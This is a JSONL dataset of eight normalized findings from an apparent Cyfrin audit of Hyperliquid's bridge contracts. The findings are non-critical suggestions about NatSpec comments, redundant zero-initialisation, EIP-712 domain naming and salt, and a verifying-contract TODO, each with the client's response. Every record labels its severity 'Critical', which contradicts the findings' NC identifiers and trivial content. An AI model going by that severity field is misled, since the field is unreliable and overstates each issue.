{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-010", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 10, "page_start": null, "title": "[NC-08] Add missing NatSpec comments to document function parameters and behaviour", "short_summary": null, "description_md": "It is recommended to document all function behaviours and parameters, especially if they are public-facing.\n", "impact_md": null, "mitigation_md": null, "poc_md": null, "other_md": null, "full_markdown": "## [NC-08] Add missing NatSpec comments to document function parameters and behaviour\n\nIt is recommended to document all function behaviours and parameters, especially if they are public-facing.\n\n### `f045dbf` Resolution\n\nThe client team acknowledges this finding with the following comment:\n\n> Light comments were added to functions in `Bridge.sol`.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-08", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-14T13:48:06.403051+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-14T13:48:06.404515+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-08", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-011", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 11, "page_start": null, "title": "[NC-09] No need to explicitly initialize variables to 0", "short_summary": null, "description_md": "Variables are initalized to 0 by default in Solidity, so a [number](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L169-L170) of [superfluous](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L173) [assigments](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L236-L237) can be removed.\n", "impact_md": null, "mitigation_md": null, "poc_md": null, "other_md": null, "full_markdown": "## [NC-09] No need to explicitly initialize variables to 0\n\nVariables are initalized to 0 by default in Solidity, so a [number](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L169-L170) of [superfluous](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L173) [assigments](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L236-L237) can be removed.\n\n### `f045dbf` Resolution\n\nSuperfluous assignments have been removed.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-09", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-14T13:48:06.403051+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-14T13:48:06.404515+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-09", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-012", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 12, "page_start": null, "title": "[NC-10] Use addition assignment operator", "short_summary": null, "description_md": "The addition assignment operator `+=` can be used when [checking new validator powers](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L238).\n", "impact_md": null, "mitigation_md": null, "poc_md": null, "other_md": null, "full_markdown": "## [NC-10] Use addition assignment operator\n\nThe addition assignment operator `+=` can be used when [checking new validator powers](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Bridge.sol#L238).\n\n### `f045dbf` Resolution\n\nThe addition assignment operator has been used.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-10", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-14T13:48:06.403051+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-14T13:48:06.404515+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-10", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-013", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 13, "page_start": null, "title": "[NC-11] Localhost chain id can be 1337 or 31337", "short_summary": null, "description_md": "The default localhost chain id for some frameworks (e.g. HardHat) is `31337` rather than `1337`. For example, it is not possible to run signature tests using forge without changing `Signature::LOCALHOST_CHAIN_ID` to `31337`.\n", "impact_md": null, "mitigation_md": null, "poc_md": null, "other_md": null, "full_markdown": "## [NC-11] Localhost chain id can be 1337 or 31337\n\nThe default localhost chain id for some frameworks (e.g. HardHat) is `31337` rather than `1337`. For example, it is not possible to run signature tests using forge without changing `Signature::LOCALHOST_CHAIN_ID` to `31337`.\n\n### `f045dbf` Resolution\n\nThis has been resolved by the resolution of NC-12.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-11", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-14T13:48:06.403051+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-14T13:48:06.404515+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-11", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-014", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 14, "page_start": null, "title": "[NC-12] Rename to DOMAIN_SEPARATOR and use `block.chainId` directly", "short_summary": null, "description_md": "References to `*_DOMAIN_HASH` in `Signature` should be renamed to `*_DOMAIN_SEPARATOR` to be more consistent with the EIP and avoid confusion. Additionally, it is recommended to use `block.chainId` directly, caching on contract creation and only recomputing the domain separator if the chain id changes, removing the need for multiple different separators to be defined.\n", "impact_md": null, "mitigation_md": null, "poc_md": null, "other_md": null, "full_markdown": "## [NC-12] Rename to DOMAIN_SEPARATOR and use `block.chainId` directly\n\nReferences to `*_DOMAIN_HASH` in `Signature` should be renamed to `*_DOMAIN_SEPARATOR` to be more consistent with the EIP and avoid confusion. Additionally, it is recommended to use `block.chainId` directly, caching on contract creation and only recomputing the domain separator if the chain id changes, removing the need for multiple different separators to be defined.\n\n### `f045dbf` Resolution\n\nThe client team has removed the domain separator contants in favour of a single `EIP712_DOMAIN_SEPARATOR` constant with the following comment in response to the Cyfrin team's comment about recomputing the domain separator if the chain id changes:\n\n> Hard fork concern potentially just an edge case not worth thinking about.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-12", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-14T13:48:06.403051+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-14T13:48:06.404515+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-12", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-015", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 15, "page_start": null, "title": "[NC-13] Rename to `EIP712_DOMAIN_TYPEHASH`", "short_summary": null, "description_md": "Add an [additional underscore](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Signature.sol#L19) for readability.\n", "impact_md": null, "mitigation_md": null, "poc_md": null, "other_md": null, "full_markdown": "## [NC-13] Rename to `EIP712_DOMAIN_TYPEHASH`\n\nAdd an [additional underscore](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Signature.sol#L19) for readability.\n\n### `f045dbf` Resolution\n\nThe constant has been renamed to `EIP712_DOMAIN_TYPEHASH`.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-13", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-14T13:48:06.403051+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-14T13:48:06.404515+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-13", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-016", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 16, "page_start": null, "title": "[NC-14] Include `byte32 salt` in domain typehash", "short_summary": null, "description_md": "Per the [EIP](https://eips.ethereum.org/EIPS/eip-712), `bytes32 salt` should be added to the [domain separator](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Signature.sol#L20) as a last-resort means to distinguish this application from others. Whilst it is unlikely that there would be signatures generated for other contracts that could be replayed onto the bridge, inclusion of a salt gives additional security assurances for little additional overhead.\n", "impact_md": null, "mitigation_md": null, "poc_md": null, "other_md": null, "full_markdown": "## [NC-14] Include `byte32 salt` in domain typehash\n\nPer the [EIP](https://eips.ethereum.org/EIPS/eip-712), `bytes32 salt` should be added to the [domain separator](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Signature.sol#L20) as a last-resort means to distinguish this application from others. Whilst it is unlikely that there would be signatures generated for other contracts that could be replayed onto the bridge, inclusion of a salt gives additional security assurances for little additional overhead.\n\n### `f045dbf` Resolution\n\nThe client team acknowledges this finding with the following comment:\n\n> We don’t think this is a useful change. Since only the validators generate these signatures for the bridge, we do not need to worry about the events being replayed on other smart contracts. Also, including `byte32 salt` causes problems when generating signatures using the rust client code.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-14", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-14T13:48:06.403051+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-14T13:48:06.404515+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-14", "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report-017", "doc_id": "cyfrin_2023-04-11-cyfrin-hyperliquid-dex-report", "finding_index": 17, "page_start": null, "title": "[NC-15] Verifying contract TODO", "short_summary": null, "description_md": "Update the [verifying contract address](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Signature.sol#L25).\n", "impact_md": null, "mitigation_md": null, "poc_md": null, "other_md": null, "full_markdown": "## [NC-15] Verifying contract TODO\n\nUpdate the [verifying contract address](https://github.com/hyperliquid-dex/contracts/blob/e0aff464865aa98c09450702d7fb36b1fcd4508c/Signature.sol#L25).\n\n### `f045dbf` Resolution\n\nThe client team acknowledges this finding with the following comment:\n\n> Removed the TODO. Keeping the verifying address as the zero address, though slightly confusing, is more convenient for us and has no significant drawbacks.\n", "severity": "Critical", "difficulty": null, "type": null, "finding_id": "NC-15", "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/hyperliquid-dex/contracts", "org": "hyperliquid-dex", "name": "contracts", "commit": "e0aff464865aa98c09450702d7fb36b1fcd4508c", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2023-04-11-cyfrin-hyperliquid-dex-report.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-14T13:48:06.403051+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-14T13:48:06.404515+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Critical", "Difficulty": null, "Type": null, "Finding ID": "NC-15", "Target": null}}
